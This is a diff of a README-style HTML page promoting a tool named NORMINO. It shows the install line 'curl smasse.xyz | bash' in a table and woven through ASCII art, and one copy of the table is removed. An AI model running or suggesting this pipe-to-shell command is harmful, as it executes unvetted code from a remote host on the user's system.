@@ -96,11 +96,6 @@
 <br>
 </br>
 
-<table border="1" align="center" cellpadding="10" cellspacing="0" style="border-collapse: collapse; font-family: monospace; font-size: 20px;">
-  <tr>
-    <td>⭐⭐ NORMINO ⭐⭐ : curl smasse.xyz | bash</td>
-  </tr>
-</table>
 
 
 <h1 align="center">
@@ -110,7 +105,7 @@
        <td>⭐⭐NORMINO⭐⭐ : curl smasse.xyz | bash
       </tr>
     </table>
-      <img src="https://i.pinimg.com/originals/7f/4c/4a/7f4c4a02703fada4e32c89c161c1bceb.gif" alt="Sam et sa cousine" style="width:1000px; height:300px;">
+      <img src="https://github.com/Axeltheaxelotl/boite-a-foutre/blob/main/67c9cfd20d306676691206.gif?raw=true" alt="Sam et sa cousine" style="width:1000px; height:300px;">
       <br>
 curl smasse⢀⣤⣤⣤⣤⡀xyz | bash⠀curl s
 masse.xyz ⢠⣿⠋⠀⠀⠙⢿⣦⡀| bash curl sm
